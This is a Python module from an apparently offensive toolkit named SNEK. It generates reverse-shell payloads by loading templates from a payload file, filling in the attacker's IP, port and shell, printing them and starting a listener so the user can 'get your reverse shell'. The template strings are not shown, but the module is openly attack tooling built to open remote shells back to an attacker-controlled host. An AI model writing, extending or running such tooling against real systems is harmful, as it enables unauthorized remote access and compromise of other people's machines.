# Copyright 2023 2xdropout

import SNEKactions
from termcolor import colored

def rev_shell_check():
    checkList = ['attackerPort','attackerIP','payloadVector','rShell']
    
    for item in checkList:
        if SNEKactions.get_var(str(item)) is None:
            print(str(item),' is not set!')
            return False
    
    return True
    

def rev_shell_payload_text():
    os = SNEKactions.get_var('os')
    ip = SNEKactions.get_var('attackerIP')
    port = SNEKactions.get_var('attackerPort')
    vector = SNEKactions.get_var('payloadVector')
    shell = SNEKactions.get_var('rShell')
    payloads = []
    payloadFile = './SNEK_Payloads/reverse.SNECK'

    # Get payloads from file
    if os in ['windows','linux']:
        with open(payloadFile,'r') as file:
            for line in file:
                if line[:1] == '#':
                    pass
                else:
                    midAss = line.split('~~')[1]
                    mid = midAss.split('~~')[0]
                    if line.split('~~')[0] == os and mid == vector:
                        payloads.append(line)
        file.close()
    else:
        with open(payloadFile,'r') as file:
            for line in file:
                midAss = line.split('~~')[1]
                mid = midAss.split('~~')[0]
                if line.split('~~')[0] == 'generic' and mid == vector:
                    payloads.append(line)
    
    for item in payloads:
        ass =  item.split('~~')[2]
        rawPayload = ass.replace("ATTACKER", str(ip))
        rawPayload = rawPayload.replace("ATTACKPORT", str(port))
        payload = rawPayload.replace("REVSHELL", str(shell))
        print(colored(payload.rstrip(),"white","on_red"))
        print(' ')
    
    #print('\n1.) Launch the listner using the "listner" command')
    print('\nUse one of the above payloads to connect to the listner and get your reverse shell!\n')

    SNEKactions.launch_listner()


def get_payload(layer, style):
    # Data checks
    if layer == 'shells_reverse':
        if not rev_shell_check():
            print("MISSING DATA ABORTING")
            return
        else:
            if style == 'text':
                rev_shell_payload_text()